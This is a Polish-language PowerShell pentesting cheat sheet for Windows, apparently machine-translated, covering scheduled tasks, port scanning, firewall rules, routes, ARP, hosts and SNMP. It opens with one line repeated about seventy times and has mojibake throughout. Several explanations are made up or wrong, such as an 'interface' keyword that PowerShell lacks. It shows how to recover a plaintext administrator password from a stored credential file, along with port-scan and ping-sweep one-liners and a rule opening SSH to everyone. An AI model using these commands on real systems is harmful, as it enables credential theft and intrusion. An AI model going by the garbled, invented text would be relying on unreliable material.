- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `
```
Get-Service
```
## Has≈Ço zabezpieczonego ciƒÖgu znak√≥w

Aby uzyskaƒá dostƒôp do has≈Ça przechowywanego jako zabezpieczony ciƒÖg znak√≥w w PowerShell, mo≈ºemy u≈ºyƒá nastƒôpujƒÖcego kodu:

```powershell
$secureString = ConvertTo-SecureString -String "has≈Ço" -AsPlainText -Force
$plainText = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
```

W powy≈ºszym kodzie tworzymy zabezpieczony ciƒÖg znak√≥w `$secureString` przy u≈ºyciu funkcji `ConvertTo-SecureString`. Nastƒôpnie, za pomocƒÖ metody `SecureStringToBSTR`, konwertujemy go na niezabezpieczony ciƒÖg znak√≥w `$plainText`.

Warto zauwa≈ºyƒá, ≈ºe przechowywanie hase≈Ç jako zabezpieczonych ciƒÖg√≥w znak√≥w nie jest zalecane, poniewa≈º istnieje ryzyko ich odczytania przez nieuprawnione osoby. Lepiej jest u≈ºywaƒá innych metod przechowywania hase≈Ç, takich jak uwierzytelnianie wielosk≈Çadnikowe lub zarzƒÖdzanie has≈Çami za pomocƒÖ narzƒôdzi do zarzƒÖdzania to≈ºsamo≈õciami.
```powershell
$pw=gc admin-pass.xml | convertto-securestring #Get the securestring from the file
$cred=new-object system.management.automation.pscredential("administrator", $pw)
$cred.getnetworkcredential() | fl * #Get plaintext password
```
## Zaplanowane zadania

Scheduled Tasks (Zaplanowane zadania) to mechanizm w systemie Windows, kt√≥ry umo≈ºliwia uruchamianie okre≈õlonych polece≈Ñ lub skrypt√≥w w okre≈õlonym czasie lub w okre≈õlonych interwa≈Çach czasowych. Jest to przydatne narzƒôdzie zar√≥wno dla administrator√≥w systemu, jak i dla pentester√≥w, kt√≥rzy mogƒÖ wykorzystaƒá je do wykonania r√≥≈ºnych dzia≈Ça≈Ñ w celu uzyskania dostƒôpu do systemu lub wykonania innych zada≈Ñ.

### PrzeglƒÖd zaplanowanych zada≈Ñ

Aby wy≈õwietliƒá listƒô wszystkich zaplanowanych zada≈Ñ w systemie, mo≈ºna u≈ºyƒá polecenia `Get-ScheduledTask`. Polecenie to zwr√≥ci informacje takie jak nazwa zadania, ≈õcie≈ºka do pliku wykonywalnego, opis zadania, stan zadania (w≈ÇƒÖczone/wy≈ÇƒÖczone) oraz harmonogram uruchamiania zadania.

```powershell
Get-ScheduledTask
```

### Tworzenie nowego zaplanowanego zadania

Aby utworzyƒá nowe zaplanowane zadanie, mo≈ºna u≈ºyƒá polecenia `New-ScheduledTask`. Polecenie to wymaga podania nazwy zadania, ≈õcie≈ºki do pliku wykonywalnego, harmonogramu uruchamiania zadania oraz innych opcjonalnych parametr√≥w, takich jak argumenty wywo≈Çania czy konto, na kt√≥rym zadanie ma byƒá uruchamiane.

```powershell
New-ScheduledTask -Action (New-ScheduledTaskAction -Execute "C:\path\to\executable.exe") -Trigger (New-ScheduledTaskTrigger -Daily -At 3am) -TaskName "MyScheduledTask"
```

### Usuwanie zaplanowanego zadania

Aby usunƒÖƒá zaplanowane zadanie, mo≈ºna u≈ºyƒá polecenia `Unregister-ScheduledTask`. Polecenie to wymaga podania nazwy zadania, kt√≥re ma zostaƒá usuniƒôte.

```powershell
Unregister-ScheduledTask -TaskName "MyScheduledTask"
```

### Modyfikowanie zaplanowanego zadania

Aby zmodyfikowaƒá istniejƒÖce zaplanowane zadanie, mo≈ºna u≈ºyƒá polecenia `Set-ScheduledTask`. Polecenie to wymaga podania nazwy zadania oraz nowych parametr√≥w, kt√≥re majƒÖ zostaƒá zmienione.

```powershell
Set-ScheduledTask -TaskName "MyScheduledTask" -Trigger (New-ScheduledTaskTrigger -Weekly -DaysOfWeek Monday) -Description "New description"
```

### Uruchamianie zaplanowanego zadania

Aby natychmiastowo uruchomiƒá zaplanowane zadanie, mo≈ºna u≈ºyƒá polecenia `Start-ScheduledTask`. Polecenie to wymaga podania nazwy zadania, kt√≥re ma zostaƒá uruchomione.

```powershell
Start-ScheduledTask -TaskName "MyScheduledTask"
```

### Podsumowanie

Zaplanowane zadania sƒÖ przydatnym narzƒôdziem w systemie Windows, kt√≥re mo≈ºna wykorzystaƒá do automatyzacji r√≥≈ºnych zada≈Ñ. Zar√≥wno administratorzy systemu, jak i pentesterzy mogƒÖ korzystaƒá z tych mechanizm√≥w w celu zarzƒÖdzania systemem lub przeprowadzania test√≥w penetracyjnych.
```powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
### Skanowanie port√≥w

Skanowanie port√≥w to proces identyfikacji otwartych port√≥w na docelowym systemie. Pozwala to na zidentyfikowanie us≈Çug dzia≈ÇajƒÖcych na tych portach i potencjalne luki w zabezpieczeniach. Istnieje wiele narzƒôdzi do skanowania port√≥w, takich jak Nmap, kt√≥re mo≈ºna wykorzystaƒá do przeprowadzenia skanowania port√≥w w celach pentestowych.

#### Nmap

Nmap jest jednym z najpopularniejszych narzƒôdzi do skanowania port√≥w. Pozwala na skanowanie pojedynczych host√≥w lub ca≈Çych sieci w celu identyfikacji otwartych port√≥w i us≈Çug. Poni≈ºej przedstawiono kilka przyk≈Çad√≥w u≈ºycia Nmap:

- Skanowanie pojedynczego hosta:
```
nmap <adres_ip>
```

- Skanowanie ca≈Çej sieci:
```
nmap <adres_ip>/<maska>
```

- Skanowanie konkretnych port√≥w:
```
nmap -p <porty> <adres_ip>
```

- Skanowanie z wykorzystaniem specyficznych skrypt√≥w:
```
nmap -sC <adres_ip>
```

Nmap oferuje wiele opcji i funkcji, kt√≥re mo≈ºna dostosowaƒá do konkretnych potrzeb. Warto zapoznaƒá siƒô z dokumentacjƒÖ Nmap, aby poznaƒá wszystkie mo≈ºliwo≈õci tego narzƒôdzia.

#### Wyniki skanowania

Po przeprowadzeniu skanowania port√≥w, otrzymasz wyniki, kt√≥re bƒôdƒÖ zawieraƒá informacje o otwartych portach, us≈Çugach dzia≈ÇajƒÖcych na tych portach oraz ewentualnych lukiach w zabezpieczeniach. Analiza tych wynik√≥w pozwoli Ci zidentyfikowaƒá potencjalne zagro≈ºenia i podjƒÖƒá odpowiednie dzia≈Çania w celu zabezpieczenia systemu.
```powershell
# Check Port or Single IP
Test-NetConnection -Port 80 10.10.10.10

# Check Port List in Single IP
80,443,8080 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$_)) "Port $_ is open!"} 2>$null

# Check Port Range in single IP
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("10.10.10.10", $_)) "TCP port $_ is open"} 2>$null

# Check Port List in IP Lists - 80,443,445,8080
"10.10.10.10","10.10.10.11" | % { $a = $_; write-host "[INFO] Testing $_ ..."; 80,443,445,8080 | % {echo ((new-object Net.Sockets.TcpClient).Connect("$a",$_)) "$a : $_ is open!"} 2>$null}

```
### Interfejsy

Interfejsy w PowerShell sƒÖ u≈ºywane do definiowania kontrakt√≥w, kt√≥re okre≈õlajƒÖ, jakie metody i w≈Ça≈õciwo≈õci powinny byƒá dostƒôpne w klasach implementujƒÖcych dany interfejs. Interfejsy sƒÖ u≈ºywane do tworzenia abstrakcyjnych typ√≥w danych, kt√≥re mogƒÖ byƒá implementowane przez r√≥≈ºne klasy.

Aby zdefiniowaƒá interfejs w PowerShell, u≈ºyj s≈Çowa kluczowego `interface`. Nastƒôpnie mo≈ºesz zadeklarowaƒá metody i w≈Ça≈õciwo≈õci, kt√≥re powinny byƒá dostƒôpne w klasach implementujƒÖcych ten interfejs.

Przyk≈Çad:

```powershell
interface IExampleInterface {
    [string] GetInfo()
    [void] DoSomething()
}
```

W powy≈ºszym przyk≈Çadzie zdefiniowano interfejs o nazwie `IExampleInterface`, kt√≥ry zawiera dwie metody: `GetInfo`, kt√≥ra zwraca warto≈õƒá typu `string`, oraz `DoSomething`, kt√≥ra nie zwraca ≈ºadnej warto≈õci.

Aby klasa mog≈Ça implementowaƒá interfejs, musi zadeklarowaƒá, ≈ºe implementuje dany interfejs za pomocƒÖ s≈Çowa kluczowego `implements`. Nastƒôpnie musi zaimplementowaƒá wszystkie metody i w≈Ça≈õciwo≈õci zdefiniowane w interfejsie.

Przyk≈Çad:

```powershell
class ExampleClass : IExampleInterface {
    [string] GetInfo() {
        return "This is an example"
    }

    [void] DoSomething() {
        Write-Host "Doing something"
    }
}
```

W powy≈ºszym przyk≈Çadzie klasa `ExampleClass` implementuje interfejs `IExampleInterface` poprzez zaimplementowanie metod `GetInfo` i `DoSomething`.

Interfejsy sƒÖ przydatne w PowerShell, poniewa≈º umo≈ºliwiajƒÖ tworzenie kodu bardziej elastycznego i modu≈Çowego. Dziƒôki nim mo≈ºna tworzyƒá klasy, kt√≥re sƒÖ zgodne z danym interfejsem, co u≈Çatwia testowanie, rozwijanie i utrzymanie kodu.
```powershell
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Zapora ogniowa

Firewall (zapora ogniowa) jest podstawowym narzƒôdziem do zabezpieczania systemu przed nieautoryzowanym dostƒôpem. Mo≈ºe byƒá skonfigurowany w celu blokowania lub zezwalania na ruch sieciowy na podstawie okre≈õlonych regu≈Ç. IstniejƒÖ dwa rodzaje zap√≥r ogniowych: zapora sprzƒôtowa i zapora programowa.

#### Zapora sprzƒôtowa

Zapora sprzƒôtowa to urzƒÖdzenie fizyczne, kt√≥re dzia≈Ça jako punkt kontrolny dla ruchu sieciowego. Jest umieszczona miƒôdzy sieciƒÖ wewnƒôtrznƒÖ a zewnƒôtrznƒÖ i monitoruje i blokuje nieautoryzowany ruch. Zapory sprzƒôtowe sƒÖ zazwyczaj bardziej wydajne i skuteczne ni≈º zapory programowe.

#### Zapora programowa

Zapora programowa to oprogramowanie zainstalowane na komputerze, kt√≥re kontroluje ruch sieciowy. Mo≈ºe byƒá skonfigurowana w celu blokowania lub zezwalania na ruch na podstawie okre≈õlonych regu≈Ç. Zapory programowe sƒÖ bardziej elastyczne i mogƒÖ byƒá dostosowane do indywidualnych potrzeb.

#### Konfiguracja zapory ogniowej

Konfiguracja zapory ogniowej jest kluczowa dla zapewnienia bezpiecze≈Ñstwa systemu. Oto kilka podstawowych zasad konfiguracji:

- Zablokuj domy≈õlne regu≈Çy: Wy≈ÇƒÖcz wszystkie domy≈õlne regu≈Çy, kt√≥re nie sƒÖ potrzebne, aby ograniczyƒá potencjalne luki w zabezpieczeniach.
- Zdefiniuj regu≈Çy dostƒôpu: Okre≈õl, jakie po≈ÇƒÖczenia sieciowe sƒÖ dozwolone i jakie sƒÖ blokowane. Mo≈ºna to zrobiƒá na podstawie adres√≥w IP, port√≥w, protoko≈Ç√≥w itp.
- Monitoruj ruch sieciowy: Regularnie sprawdzaj logi zapory ogniowej, aby wykryƒá nieautoryzowany ruch i podejrzane aktywno≈õci.
- Aktualizuj oprogramowanie zapory ogniowej: Upewnij siƒô, ≈ºe masz zainstalowane najnowsze aktualizacje oprogramowania zapory ogniowej, aby zapewniƒá ochronƒô przed nowymi zagro≈ºeniami.

#### Podsumowanie

Zapora ogniowa jest niezbƒôdnym narzƒôdziem do zabezpieczania systemu przed nieautoryzowanym dostƒôpem. Bez odpowiedniej konfiguracji i monitorowania mo≈ºe wystawiƒá system na ryzyko atak√≥w. Pamiƒôtaj o regularnym aktualizowaniu oprogramowania zapory ogniowej i monitorowaniu ruchu sieciowego, aby utrzymaƒá wysoki poziom bezpiecze≈Ñstwa.
```powershell
Get-NetFirewallRule -Enabled True

Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Allow

# Open SSH to the world
New-NetFirewallRule -DisplayName 'SSH (Port 22)' -Direction Inbound -LocalPort 22 -Protocol TCP -Action Allow

# Get name, proto, local and rremote ports, remote address, penable,profile and direction
## You can user the following line changing the initial filters to indicat a difefrent direction or action
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property  DisplayName, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},Profile,Direction,Action
```
### Trasa

Poni≈ºej znajduje siƒô lista polece≈Ñ PowerShell, kt√≥re mogƒÖ byƒá przydatne podczas testowania penetracyjnego system√≥w Windows.

#### Pobieranie informacji o trasie

Polecenie `Get-NetRoute` pozwala na pobranie informacji o trasach sieciowych na ho≈õcie. Mo≈ºna u≈ºyƒá go do sprawdzenia, czy istniejƒÖ jakie≈õ nieprawid≈Çowe trasy lub trasy, kt√≥re mogƒÖ byƒá wykorzystane do przechwycenia ruchu sieciowego.

```powershell
Get-NetRoute
```

#### Dodawanie trasy

Polecenie `New-NetRoute` umo≈ºliwia dodanie nowej trasy sieciowej. Mo≈ºe to byƒá przydatne, je≈õli chcesz przekierowaƒá ruch sieciowy przez inny wƒôze≈Ç lub sieƒá.

```powershell
New-NetRoute -DestinationPrefix <adres docelowy> -InterfaceIndex <indeks interfejsu> -NextHop <adres nastƒôpnego skoku>
```

#### Usuwanie trasy

Polecenie `Remove-NetRoute` s≈Çu≈ºy do usuwania istniejƒÖcych tras sieciowych.

```powershell
Remove-NetRoute -DestinationPrefix <adres docelowy> -InterfaceIndex <indeks interfejsu> -NextHop <adres nastƒôpnego skoku>
```

#### Modyfikowanie trasy

Polecenie `Set-NetRoute` pozwala na modyfikacjƒô istniejƒÖcych tras sieciowych.

```powershell
Set-NetRoute -DestinationPrefix <adres docelowy> -InterfaceIndex <indeks interfejsu> -NextHop <adres nastƒôpnego skoku>
```

#### Przekierowywanie ruchu sieciowego

Aby przekierowaƒá ruch sieciowy przez inny wƒôze≈Ç, mo≈ºna u≈ºyƒá polecenia `Set-NetRoute` do dodania nowej trasy z odpowiednim adresem docelowym, indeksem interfejsu i adresem nastƒôpnego skoku.

```powershell
Set-NetRoute -DestinationPrefix <adres docelowy> -InterfaceIndex <indeks interfejsu> -NextHop <adres nastƒôpnego skoku>
```

#### Zabezpieczanie tras

Aby zabezpieczyƒá trasy przed modyfikacjƒÖ, mo≈ºna u≈ºyƒá polecenia `Set-NetRoute` z opcjƒÖ `-PolicyStore PersistentStore`. Spowoduje to przechowywanie tras w trwa≈Çym magazynie, co uniemo≈ºliwi ich zmianƒô po ponownym uruchomieniu systemu.

```powershell
Set-NetRoute -DestinationPrefix <adres docelowy> -InterfaceIndex <indeks interfejsu> -NextHop <adres nastƒôpnego skoku> -PolicyStore PersistentStore
```

#### Podsumowanie

Trasy sieciowe sƒÖ wa≈ºnym elementem infrastruktury sieciowej. Zrozumienie, jak zarzƒÖdzaƒá trasami w systemie Windows, mo≈ºe byƒá przydatne podczas testowania penetracyjnego. Polecenia PowerShell opisane powy≈ºej mogƒÖ pom√≥c w pobieraniu, dodawaniu, usuwaniu, modyfikowaniu i zabezpieczaniu tras sieciowych.
```powershell
route print
```
### ARP

ARP (Address Resolution Protocol) jest protoko≈Çem u≈ºywanym w sieciach komputerowych do mapowania adres√≥w IP na adresy MAC. Protok√≥≈Ç ARP jest wykorzystywany do komunikacji w warstwie 2 modelu OSI (Data Link Layer). 

Atak ARP Spoofing polega na fa≈Çszowaniu odpowiedzi ARP w celu przekierowania ruchu sieciowego na inny adres MAC. Ten rodzaj ataku mo≈ºe byƒá wykorzystany do przechwytywania danych, pods≈Çuchiwania komunikacji lub przeprowadzania innych z≈Ço≈õliwych dzia≈Ça≈Ñ w sieci. 

Aby chroniƒá siƒô przed atakami ARP Spoofing, mo≈ºna zastosowaƒá techniki takie jak:
- U≈ºywanie protoko≈Çu ARP Inspection w sieciach VLAN.
- Konfiguracja statycznych wpis√≥w ARP w urzƒÖdzeniach sieciowych.
- U≈ºywanie narzƒôdzi do wykrywania i monitorowania atak√≥w ARP Spoofing.
```powershell
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```
### Hosty

W pliku hosts mo≈ºemy zdefiniowaƒá statyczne mapowania adres√≥w IP na nazwy host√≥w. Jest to przydatne w celu przekierowania ruchu sieciowego na inne adresy IP lub do blokowania dostƒôpu do okre≈õlonych stron internetowych. Poni≈ºej znajduje siƒô przyk≈Çadowa zawarto≈õƒá pliku hosts:

```plaintext
# Przyk≈Çadowy plik hosts

# Adresy IP i nazwy host√≥w
127.0.0.1       localhost
192.168.1.10    example.com
```

W powy≈ºszym przyk≈Çadzie, adres IP 127.0.0.1 jest przypisany do nazwy hosta "localhost", co oznacza, ≈ºe ‚Äã‚Äãwszelkie ≈ºƒÖdania wys≈Çane do "localhost" bƒôdƒÖ kierowane na ten adres IP. Podobnie, adres IP 192.168.1.10 jest przypisany do nazwy hosta "example.com".

Aby dodaƒá w≈Çasne mapowania do pliku hosts, nale≈ºy otworzyƒá go jako administrator i dodaƒá nowe linie w formacie "adres_IP nazwa_hosta". Na przyk≈Çad:

```plaintext
# Moje mapowania
192.168.1.20    myhost.com
```

Po zapisaniu zmian w pliku hosts, nowe mapowania bƒôdƒÖ obowiƒÖzywaƒá. Jest to przydatne narzƒôdzie podczas testowania aplikacji internetowych lub w celu zablokowania dostƒôpu do niechcianych stron internetowych.
```powershell
Get-Content C:\WINDOWS\System32\drivers\etc\hosts
```
### Ping

Ping jest narzƒôdziem wiersza polece≈Ñ, kt√≥re s≈Çu≈ºy do sprawdzania dostƒôpno≈õci hosta w sieci. Wysy≈Ça ono pakiet ICMP Echo Request do okre≈õlonego hosta i oczekuje na odpowied≈∫ ICMP Echo Reply. Ping jest czƒôsto u≈ºywany do diagnozowania problem√≥w z sieciƒÖ, sprawdzania op√≥≈∫nie≈Ñ i okre≈õlania, czy dany host jest dostƒôpny.

#### Sk≈Çadnia

```powershell
ping [-t] [-a] [-n licznik] [-l rozmiar] [-f] [-i TTL] [-v TOS] [-r licznik] [-s ≈∫r√≥d≈Ço] [-w czas] [-R] [-S] [adres]
```

#### Parametry

- `-t` - Pinguje okre≈õlony host w niesko≈Ñczono≈õƒá, a≈º zostanie przerwany przez u≈ºytkownika.
- `-a` - Wy≈õwietla nazwƒô hosta dla podanego adresu IP.
- `-n licznik` - Okre≈õla liczbƒô pakiet√≥w do wys≈Çania.
- `-l rozmiar` - Okre≈õla rozmiar pakietu w bajtach.
- `-f` - Ustawia flagƒô Don't Fragment w pakietach ICMP Echo Request.
- `-i TTL` - Okre≈õla warto≈õƒá pola Time to Live (TTL) w pakietach ICMP Echo Request.
- `-v TOS` - Okre≈õla warto≈õƒá pola Type of Service (TOS) w pakietach ICMP Echo Request.
- `-r licznik` - Okre≈õla liczbƒô skok√≥w (router√≥w), kt√≥re pakiet mo≈ºe wykonaƒá.
- `-s ≈∫r√≥d≈Ço` - Okre≈õla adres ≈∫r√≥d≈Çowy pakiet√≥w ICMP Echo Request.
- `-w czas` - Okre≈õla czas oczekiwania na odpowied≈∫ w milisekundach.
- `-R` - W≈ÇƒÖcza rejestrowanie ≈õcie≈ºki pakiet√≥w w odpowiedziach ICMP Echo Reply.
- `-S` - W≈ÇƒÖcza rejestrowanie adresu ≈∫r√≥d≈Çowego w odpowiedziach ICMP Echo Reply.

#### Przyk≈Çady u≈ºycia

```powershell
ping google.com
ping -n 5 192.168.1.1
ping -t -w 1000 8.8.8.8
```

Ping jest przydatnym narzƒôdziem do sprawdzania dostƒôpno≈õci host√≥w w sieci. Mo≈ºe byƒá r√≥wnie≈º u≈ºywany w celach testowych i diagnostycznych.
```powershell
$ping = New-Object System.Net.Networkinformation.Ping
1..254 | % { $ping.send("10.9.15.$_") | select address, status }
```
### SNMP

SNMP (Simple Network Management Protocol) jest protoko≈Çem sieciowym u≈ºywanym do zarzƒÖdzania i monitorowania urzƒÖdze≈Ñ sieciowych. Pozwala na zdalne monitorowanie i kontrolƒô urzƒÖdze≈Ñ takich jak routery, prze≈ÇƒÖczniki, serwery itp. Protok√≥≈Ç SNMP dzia≈Ça na zasadzie zapytania i odpowiedzi, gdzie zarzƒÖdzajƒÖcy urzƒÖdzenie wysy≈Ça zapytanie do urzƒÖdzenia docelowego, a to zwraca odpowied≈∫ zawierajƒÖcƒÖ informacje o swoim stanie i konfiguracji.

#### Komponenty SNMP

Protok√≥≈Ç SNMP sk≈Çada siƒô z trzech g≈Ç√≥wnych komponent√≥w:

1. **ZarzƒÖdzajƒÖcy** (Manager): Jest to urzƒÖdzenie lub aplikacja odpowiedzialna za monitorowanie i zarzƒÖdzanie urzƒÖdzeniami sieciowymi. ZarzƒÖdzajƒÖcy wysy≈Ça zapytania do urzƒÖdze≈Ñ docelowych i odbiera odpowiedzi.

2. **Agent**: Jest to oprogramowanie lub modu≈Ç zainstalowany na urzƒÖdzeniu docelowym, kt√≥re odpowiada na zapytania zarzƒÖdzajƒÖcego. Agent monitoruje i zbiera informacje o stanie urzƒÖdzenia i przekazuje je do zarzƒÖdzajƒÖcego.

3. **MIB** (Management Information Base): Jest to baza danych zawierajƒÖca informacje o urzƒÖdzeniach sieciowych, kt√≥re mogƒÖ byƒá monitorowane i zarzƒÖdzane za pomocƒÖ protoko≈Çu SNMP. MIB definiuje strukturƒô danych i dostƒôpne parametry dla urzƒÖdze≈Ñ.

#### Rodzaje zapyta≈Ñ SNMP

Protok√≥≈Ç SNMP obs≈Çuguje r√≥≈ºne rodzaje zapyta≈Ñ, kt√≥re mogƒÖ byƒá wysy≈Çane przez zarzƒÖdzajƒÖcego do agenta. Najwa≈ºniejsze z nich to:

- **GET**: ZarzƒÖdzajƒÖcy wysy≈Ça zapytanie GET do agenta, aby uzyskaƒá warto≈õƒá okre≈õlonego parametru.

- **SET**: ZarzƒÖdzajƒÖcy wysy≈Ça zapytanie SET do agenta, aby zmieniƒá warto≈õƒá okre≈õlonego parametru.

- **GETNEXT**: ZarzƒÖdzajƒÖcy wysy≈Ça zapytanie GETNEXT do agenta, aby uzyskaƒá nastƒôpny parametr w MIB.

- **GETBULK**: ZarzƒÖdzajƒÖcy wysy≈Ça zapytanie GETBULK do agenta, aby uzyskaƒá wiele warto≈õci parametr√≥w jednocze≈õnie.

#### Zabezpieczenia SNMP

Protok√≥≈Ç SNMP mo≈ºe byƒá podatny na ataki, dlatego istniejƒÖ r√≥≈ºne mechanizmy zabezpiecze≈Ñ, kt√≥re mo≈ºna zastosowaƒá, aby zminimalizowaƒá ryzyko. Niekt√≥re z tych mechanizm√≥w to:

- **Community String**: Jest to has≈Ço u≈ºywane do uwierzytelniania zarzƒÖdzajƒÖcego i agenta. Nale≈ºy zadbaƒá o silne has≈Ço i regularnie je zmieniaƒá.

- **Access Control**: Mo≈ºna skonfigurowaƒá kontrolƒô dostƒôpu, aby okre≈õliƒá, kt√≥re adresy IP majƒÖ uprawnienia do komunikacji z agentem.

- **SNMPv3**: Jest to najnowsza wersja protoko≈Çu SNMP, kt√≥ra wprowadza silniejsze mechanizmy uwierzytelniania i szyfrowania.

#### Podsumowanie

